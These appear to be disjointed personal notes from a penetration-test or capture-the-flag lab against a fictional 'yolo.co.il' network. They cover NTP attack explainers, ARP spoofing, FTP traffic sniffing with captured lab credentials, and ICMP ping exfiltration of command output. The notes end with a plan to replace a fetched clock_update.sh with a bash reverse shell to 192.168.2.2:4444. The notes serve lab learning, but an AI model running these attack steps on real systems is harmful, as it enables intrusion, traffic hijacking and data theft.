ntpdate -q time.windows.com > current_clock
**`ntpdate`**: This command is used to query or set the system clock from a remote Network Time Protocol (NTP) server. By default, it adjusts the local system time to match the time provided by the NTP server.
**`time.windows.com`**: This is the NTP server being queried. 

chmod +x clock_update.sh
./clock_update.sh

server 20.101.57.9, stratum 3, offset +0.000706, delay 0.08998
19 Mar 15:36:18 ntpdate[22608]: adjust time server 20.101.57.9 offset +0.000706 sec

difference offset +0.000706

modtime   	show last modification time of remote file
idle      	get (set) idle timer on remote side
passive   	enter passive transfer mode
quote     	send arbitrary ftp command

ftp> rhelp
214-The following commands are recognized:
 ABOR   ALLO   APPE   CDUP   CWD    DELE   EPRT   EPSV  
 FEAT   HELP   LIST   MDTM   MKD    MLSD   MLST   MODE  
 NLST   NOOP   OPTS   PASS   PASV   PORT   PWD    QUIT  
 REIN   REST   RETR   RMD    RNFR   RNTO   SITE   SIZE  
 STAT   STOR   STOU   STRU   SYST   TYPE   USER   XCUP  
 XCWD   XMKD   XPWD   XRMD  
214 Help command successful.

ftp> help site
site      	send site specific command to remote server
		Try "rhelp site" or "site help" for more information
ftp> rhelp site
214 Syntax: SITE <SP> site-command (execute SITE command).

ftp> help trace
trace     	toggle packet tracing

did some spoofing on 192.168.2.3 and found yolo_121.yolo_main

perform enums: 
no result

ssh -L 10000:192.168.2.3:10000 -p 2222 dexter@10.1.22.121


for now i have found:

yolo.co.il

admin.yolo.co.il
	admin login page requires credentials
	(ssh credentials for dexter to 10.1.22.121)
	
dns.yolo.co.il
	(webmin service on 192.168.2.3)
		requires credentials
		
ftp.yolo.co.il 
	(credential for server from different subnet)

yolo_121.yolo_main 
	whatever that is

192.168.3.1 
	only known credentials used for ftp server
	and that it requires the cloch_sync all the time

192.168.3.1 is connecting to the ftp.. the only potential exploit?




An **NTP (Network Time Protocol) server** is a server that synchronizes the time across computers and devices in a network. It ensures that all systems have the same accurate time, which is crucial for security, logging, and coordination of tasks.
- NTP servers communicate over **UDP port 123**.

ntpdate -q time.windows.com > current_clock:

- It allows you to check the time difference without changing the system time.
- Useful for debugging time synchronization issues before actually applying changes.

sudo tcpdump -i eth0 host 192.168.3.1 -w capture.pcap

## **NTP Amplification Attack**

### **Vulnerability**

- NTP can be abused for **DDoS reflection attacks** where an attacker spoofs a victim’s IP and sends small queries to the NTP server.
- The server then responds with a much larger response, overwhelming the victim’s network.

## **NTP Spoofing (Man-in-the-Middle Attack)**

### **Vulnerability**

- Since NTP is typically **unauthenticated**, an attacker can spoof an NTP server and send false timestamps to a client.
- This can be used to:
    - **Manipulate timestamps** in logs, authentication mechanisms, and financial transactions.
    - **Expire security certificates** earlier than expected.
    - Cause systems to **rollback time**, potentially re-enabling expired vulnerabilities.

running ntpdate -q 20.101.57.9

## **Buffer Overflow Vulnerabilities**

Several **buffer overflow vulnerabilities** have been found in NTP, especially in older versions:

- **CVE-2014-9295** – Stack buffer overflow leading to remote code execution.
- **CVE-2015-7973** – `crypto-NAK` vulnerability allowing an attacker to deny NTP service.
- **CVE-2018-7182** – Integer overflow in packet processing.

to check version:
ntpq -c rv 20.101.57.9
nothing recieved

## **Stratum Attacks**

### **Vulnerability**

- The **stratum** level represents the distance from the authoritative time source.
- Attackers can set up **rogue NTP servers** and trick clients into using them by advertising a **lower stratum number**.
- This can be used for **time manipulation attacks**.

ntpq -c "opeers" 20.101.57.9

## **NTP Query Information Disclosure**

### **Vulnerability**

- **Public NTP servers** often expose system details when queried.
- Attackers can fingerprint the system, check uptime, OS version, and find potential vulnerabilities.

ntpq -c "keyid" 20.101.57.9
returns **"no keyid defined"** because the NTP server at `20.101.57.9` **is not using authentication**.

With no authentication, an attacker can simply **capture** valid time packets and resend them, tricking a system into accepting fake or outdated time.

ntpq -c rv 20.101.57.9
This will retrieve details like the server version, precision, stratum level, and sync source.

ntpq -p 20.101.57.9
This shows which NTP servers this machine syncs with.

### **MITM (Man-in-the-Middle) NTP Injection**

- If an attacker **intercepts NTP traffic** (e.g., on an open Wi-Fi network), they can inject **fake timestamps** into responses.
- Since **NTP uses UDP (port 123) without encryption**, it's vulnerable to **spoofing and replay attacks.**

🔹 Example: An attacker **captures NTP packets**, modifies them, and resends them with fake timestamps.  
Using tools like `ettercap` or `scapy`, an attacker can **redirect and alter** NTP traffic.


### **NTP Reply Spoofing (Packet Injection)**

- If an attacker **spoofs an NTP response**, they can force a client to accept a wrong time.
- This works **if the client does not use authentication (no `keyid`).**

🔹 Example: Sending a **forged** NTP reply


`hping3 -2 -p 123 -c 1 --spoof victim_ip malicious-ntp-server.com`

This makes the **victim think the NTP server is sending valid timestamps** when it's actually fake.


sudo ntpdate -q 20.101.57.9
If it **adjusts time** without authentication, it's a **spoofing risk**.

🔹 **`time.windows.com` is not a single server**—it’s a **DNS round-robin** that resolves to **multiple different NTP servers**.  
🔹 Each machine might query a **different** IP from the pool, and those servers might have **slightly different times**.

nslookup time.windows.com

send pcap of communication of servers to the ftp


*.3.1 is contacting ftp server asks for PWD and leaves 
maybe check and forge the request of PWD to a different one?





sudo tcpdump -i eth0 host 192.168.3.1
sudo arpspoof -i eth0 -t 192.168.2.8 192.168.2.254
sudo arpspoof -i eth0 -t 192.168.2.254 192.168.2.8

implemented forwarder

ls -l */ on ftp return
clock/

!command Run local shell commands !!!!!!!!!!!!!!!!!!!!!!!!!Q
!grep "search_term" myfile.txt
!zcat myfile.gz
!less myfile.txt
 !more myfile.txt
  !cat myfile.txt

lftp can create directories on the client side and file!!!!
!echo "Hello World" > myfile.txt
!ps aux
!df -h
!ls
!pwd
!cat myfile.txt



sudo tcpdump -i eth0 host 192.168.2.8
sudo python3 march_20_sim_LEV.py

sudo tcpdump -i eth0 host 192.168.3.1 -s 0 -w lstry.pcap


!echo $PWD > local-file.txt

wait for FTP: PORT 192,168,2,2,176,23
then send there a C2 of my own 
i also need to execute it somehow

PORT 192,168,2,2,179,197
PORT a1,a2,a3,a4,p1,p2

- Multiply `p1` by 256: `179 * 256 = 45824`.
- Add `p2` to the result: `45824 + 197 = 46021`.

sudo tcpdump -i any host 192.168.2.2 and portrange 1024-65535 and not port 22 and not host 10.10.2.46 -n -v -A

 modified_payload = b'!echo \'#!/bin/bash\nwhile true; do\n    ping -c 1 192.168.2.2\n    sleep 0.1\ndone\' > clock_update.sh'



### **1. Adding Custom Payload to Ping**
ping -c 5 -p 68656c6c6f 192.168.2.2
✅ This sends `hello` (`68656c6c6f` in hex) inside the ping request.

### **2. Sending a Larger Custom Message**
You can send larger payloads using the `-s` flag (packet size):
ping -c 5 -s 100 -p 41424344 192.168.2.2
✅ This sends a 100-byte ICMP packet, filling it with `ABCD` (`41424344` in hex).

### **4. Alternative: Custom ICMP Packet with `hping3`**
If you need **longer payloads**, use `hping3`:
hping3 -c 5 -1 -E myfile.txt 192.168.2.2
✅ This sends **the contents of `myfile.txt`** inside ICMP packets.

1) first save result of ls in file ls.txt
ls > ls.txt

2) then:
 ping -s 100 -p $(xxd -p ls.txt) 192.168.2.254

-s can be up to mtu


before that i will try and ping the result immediately  

modified_payload = b'ls | xxd -p | ping -s 100 -p $(xxd -p) 192.168.2.2'

!ls > ls.txt && ping -s 100 -p $(xxd -p ls.txt) 192.168.2.8



USER
ftp_yolo
CyberSec@12


import subprocess

# Capture the result of 'ls' and convert it to hex format
ls_result = subprocess.check_output('ls', shell=True)

# Convert the 'ls' result to hexadecimal using xxd
hex_result = subprocess.check_output(['xxd', '-p'], input=ls_result)

# Convert hex_result to a string that will be passed as a ping payload
ping_command = f"ping -s 100 -p {hex_result.decode().strip()} 192.168.2.2"

# Execute the ping command
subprocess.run(ping_command, shell=True)

ping -s 100 -p $(od -An -tx1 < ls.txt | tr -d ' \n') 192.168.2.254"

### 1. **220 pyftpdlib 1.5.0 ready**

- **Command/Response:** FTP Server's greeting message.
- **Explanation:** This is the server's welcome message, indicating that it's ready to accept FTP commands from the client.

### 2. **USER ftp_yolo**

- **Command:** `USER ftp_yolo`
- **Explanation:** This command sends the username `ftp_yolo` to the server as part of the login process.
- **Response:** `331 Username ok, send password.` - The server is asking for the password for the `ftp_yolo` user.

### 3. **PASS CyberSec@12**

- **Command:** `PASS CyberSec@12`
- **Explanation:** This command sends the password `CyberSec@12` for the user `ftp_yolo`.
- **Response:** `230 Login successful.` - The server accepts the credentials and grants access.

### 4. **PWD**

- **Command:** `PWD`
- **Explanation:** This command requests the current working directory from the server.
- **Response:** `257 "/" is the current directory.` - The server responds with the current directory (`/`).

### 5. **EPSV**

- **Command:** `EPSV`
- **Explanation:** This command is used to enter **Extended Passive Mode** (EPSV). EPSV is an FTP command used to initiate passive mode data connections. In passive mode, the server opens a random high-numbered port for data transfer and sends this information to the client.
- **Response:** `229 Entering extended passive mode (|||3003|).` - The server responds with the port range (3003) to be used for the data connection.

### 6. **TYPE I**

- **Command:** `TYPE I`
- **Explanation:** This command sets the data transfer type to binary (`I` stands for Image, which is the binary type).
- **Response:** `200 Type set to: Binary.` - The server confirms that the transfer type is set to binary.

### 7. **SIZE clock_update.sh**

- **Command:** `SIZE clock_update.sh`
- **Explanation:** This command requests the size of the file `clock_update.sh` on the server.
- **Response:** `213 44` - The server responds with the file size (44 bytes).

### 8. **RETR clock_update.sh**

- **Command:** `RETR clock_update.sh`
- **Explanation:** This command requests the retrieval of the file `clock_update.sh`.
- **Response:** `125 Data connection already open; transfer starting.` - The server confirms that the data connection is open and the transfer is starting.
- **Response (continued):** `226 Transfer complete.` - The server confirms that the file transfer has completed successfully.

### 9. **QUIT**

- **Command:** `QUIT`
- **Explanation:** This command logs the client out of the FTP server and ends the session.
- **Response:** `221 Goodbye.` - The server confirms that the session has ended.

switch file content (clock_update.sh):
ntpdate -q time.windows.com > current_clock

to c2 reverse shell

bash -i >& /dev/tcp/192.168.2.2/4444 0>&1

while i listen:

nc -lvp 4444

modified_packet[Raw].len = len(modified_packet[Raw].load)


# Remove checksums to force recalculation
del modified_packet[IP].chksum
if modified_packet.haslayer(TCP):
    del modified_packet[TCP].chksum